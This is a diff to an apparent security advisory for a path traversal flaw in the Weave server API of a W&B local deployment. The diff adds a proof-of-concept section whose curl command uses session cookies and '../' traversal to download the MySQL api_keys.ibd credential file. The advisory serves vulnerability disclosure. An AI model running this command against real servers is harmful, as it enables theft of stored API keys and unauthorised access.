@@ -30,7 +30,15 @@ The Weave server API allows remote users to fetch files from a specific director
 
 ## PoC
 
-No PoC is supplied for this issue
+```
+export WANDB=<WANDB SESSION COOKIE>
+export WANDB_SSO=<WANDB SSO SESSION COOKIE>
+export SERVER_IP=<WANDB SERVER IP>
+
+curl -s --path-as-is --cookie "wandb=$WANDB; wandb_sso=$WANDB_SSO" "http://$SERVER_IP:8080/__weave/file/vol/weave/cache/../../../vol/mysql/wandb_local/api_keys.ibd" --output apikeys.bin
+```
+
+
 
 ## Vulnerability Mitigations
 
